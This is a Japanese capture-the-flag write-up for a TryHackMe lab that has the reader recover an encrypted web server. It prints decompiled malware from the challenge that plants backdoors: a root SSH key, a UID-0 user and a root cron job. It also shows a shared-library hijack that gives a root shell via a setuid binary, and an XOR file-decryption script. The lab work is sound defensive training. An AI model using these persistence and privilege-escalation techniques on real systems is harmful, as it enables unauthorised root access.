# Recovery CTF

https://tryhackme.com/room/recovery

暗号化されたWebサーバーをリカバリするチャレンジ。

ログイン時の無限ループを回避するオプション

```sh
$ ssh alex@$TARGET /bin/bash --noprofile --norc 
alex@10.201.21.90's password: 
id
uid=1000(alex) gid=1000(alex) groups=1000(alex)
```

.bashrc から無限ループを削除したら、フラグ0が表示された。

## fixutil

```c
undefined8 main(void)
{
  FILE *pFVar1;
  
  pFVar1 = fopen("/home/alex/.bashrc","a");
  fwrite("\n\nwhile :; do echo \"YOU DIDN\'T SAY THE MAGIC WORD!\"; done &\n",1,0x3c,pFVar1);
  fclose(pFVar1);
  system("/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so");
  pFVar1 = fopen("/lib/x86_64-linux-gnu/liblogging.so","wb");
  fwrite(&bin2c_liblogging_so,0x5a88,1,pFVar1);
  fclose(pFVar1);
  system("echo pwned | /bin/admin > /dev/null");
  return 0;
}
```

## liblogging.so

文字列抽出

```sh
$ strings ./liblogging.so| grep '/'                                                
/usr/local/apache2/htdocs/
/opt/.fixutil/
/opt/.fixutil/backup.txt
/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery
/root/.ssh/authorized_keys
/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null
/bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e
/opt/brilliant_script.sh
#!/bin/sh
/etc/cron.d/evil
* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
/usr/lib/gcc/x86_64-linux-gnu/9/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
/usr/include
/home/moodr/Boxes/recovery/fixutil
```

/opt/brilliant_script.sh を無力化したらフラグ1が表示された。

## /bin/admin

```c
undefined8 main(void)
{
  int iVar1;
  size_t local_20;
  char *local_18;
  char *local_10;
  
  setresuid(0,0,0);
  setresgid(0,0,0);
  puts("Welcome to the Recoverysoft Administration Tool! Please input your password:");
  local_10 = "youdontneedtofindthepassword\n";
  local_18 = (char *)0x0;
  local_20 = 0x100;
  getline(&local_18,&local_20,stdin);
  iVar1 = strcmp(local_18,local_10);
  if (iVar1 == 0) {
    puts("This section is currently under development, sorry.");
  }
  else {
    puts("Incorrect password! This will be logged!");
    LogIncorrectAttempt(local_18);
  }
  return 0;
}
```

バッファオーバーフローは不可能。  
LogIncorrectAttempt関数をインジェクション

```c
#include <stdlib.h>
#include <stdio.h>

void LogIncorrectAttempt(const char *input) {
    system("/bin/sh");
}
```

soをコンパイルして置き換え

```sh
alex@recoveryserver:~$ gcc -fPIC -shared -o liblogging.so aaa.c
alex@recoveryserver:~$ cp ./liblogging.so /lib/x86_64-linux-gnu/liblogging.so
```

/bin/admin 実行してroot昇格成功。

```sh
alex@recoveryserver:~$ /bin/admin
Welcome to the Recoverysoft Administration Tool! Please input your password:
aaa
Incorrect password! This will be logged!
# id
uid=0(root) gid=0(root) groups=0(root),1000(alex)
```

フラグ3
```sh
# rm .ssh/authorized_keys
```

フラグ4

```sh
nano /etc/passwd
```

backup.txt でパスワードのようなものを発見。

```sh
# cat /opt/.fixutil/backup.txt
AdsipPewFlfkmll
```

webサーバーのコンテンツは何らかの形で暗号化されているが、方法不明。

```sh
# cd /usr/local/apache2/htdocs
# ls -al
total 24
drwxr-xr-x 1 root     root     4096 Jun 17  2020 .
drwxr-xr-x 1 www-data www-data 4096 May 15  2020 ..
-rw-rw-r-- 1 root     root      997 Jun 17  2020 index.html
-rw-rw-r-- 1 root     root      109 Jun 17  2020 reallyimportant.txt
-rw-rw-r-- 1 root     root       85 Jun 17  2020 todo.html
```

soファイルに暗号化関数があった。

```c
void XOREncryptWebFiles(void)
{
  long lVar1;
  int iVar2;
  char *str;
  FILE *__stream;
  char **webfiles;
  long lVar3;
  stat *psVar4;
  long in_FS_OFFSET;
  byte bVar5;
  int i;
  int amnt_webfiles;
  char *encryption_key;
  FILE *encryption_file;
  char **webfile_names;
  stat stat_res;
  
  bVar5 = 0;
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  str = (char *)malloc(0x11);
  if (str == (char *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  rand_string(str,0x10);
  psVar4 = &stat_res;
  for (lVar3 = 0x12; lVar3 != 0; lVar3 = lVar3 + -1) {
    psVar4->st_dev = 0;
    psVar4 = (stat *)((long)psVar4 + (ulong)bVar5 * -0x10 + 8);
  }
  iVar2 = stat(encryption_key_dir,(stat *)&stat_res);
  if (iVar2 == -1) {
    mkdir(encryption_key_dir,0x1c0);
  }
  __stream = fopen("/opt/.fixutil/backup.txt","a");
  fprintf(__stream,"%s\n",str);
  fclose(__stream);
  webfiles = (char **)malloc(8);
  if (webfiles == (char **)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar2 = GetWebFiles(webfiles,8);
  for (i = 0; i < iVar2; i = i + 1) {
    XORFile(webfiles[i],str);
    free(webfiles[i]);
  }
  free(webfiles);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void XORFile(char *f_path,char *encryption_key)
{
  int iVar1;
  FILE *pFVar2;
  long lVar3;
  void *__ptr;
  size_t sVar4;
  char *encryption_key_local;
  char *f_path_local;
  int i;
  int size;
  int index_of_encryption_key;
  FILE *webfile_r;
  char *f_contents;
  FILE *webfile_w;
  
  pFVar2 = fopen(f_path,"rb");
  fseek(pFVar2,0,2);
  lVar3 = ftell(pFVar2);
  iVar1 = (int)lVar3;
  fseek(pFVar2,0,0);
  __ptr = malloc((long)iVar1);
  fread(__ptr,1,(long)iVar1,pFVar2);
  fclose(pFVar2);
  for (i = 0; i < iVar1; i = i + 1) {
    sVar4 = strlen(encryption_key);
    *(byte *)((long)__ptr + (long)i) =
         *(byte *)((long)__ptr + (long)i) ^ encryption_key[(int)((ulong)(long)i % sVar4)];
  }
  pFVar2 = fopen(f_path,"wb");
  fwrite(__ptr,1,(long)iVar1,pFVar2);
  fclose(pFVar2);
  return;
}
```

復号するプログラム

```python
import sys

PASSWORD = b'AdsipPewFlfkmll'

def xor_data(data: bytes, key: bytes) -> bytes:
    key_len = len(key)
    return bytes([b ^ key[i % key_len] for i, b in enumerate(data)])

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <input_file>")
        sys.exit(1)

    input_filename = sys.argv[1]

    try:
        with open(input_filename, "rb") as f:
            input_data = f.read()
    except FileNotFoundError:
        print(f"File not found: {input_filename}")
        sys.exit(1)

    result = xor_data(input_data, PASSWORD)

    sys.stdout.buffer.write(result)

if __name__ == "__main__":
    main()
```

```sh
$ python ./decrypt.py important.txt
This text document is really important.
I hope nothing happens to it; I can't bear the thought of loosing it.

$ python ./decrypt.py todo.html    
<!--
    I'd better stop procrastinating and actually do this webpage!
    - Alex
-->       
```

3ファイル復号してWebサーバーに戻したら、フラグ5が表示された。

フラグ2は、soファイルをもとに戻したら表示された。

```sh
alex@recoveryserver:~$ cp /lib/x86_64-linux-gnu/oldliblogging.so /lib/x86_64-linux-gnu/liblogging.so
```
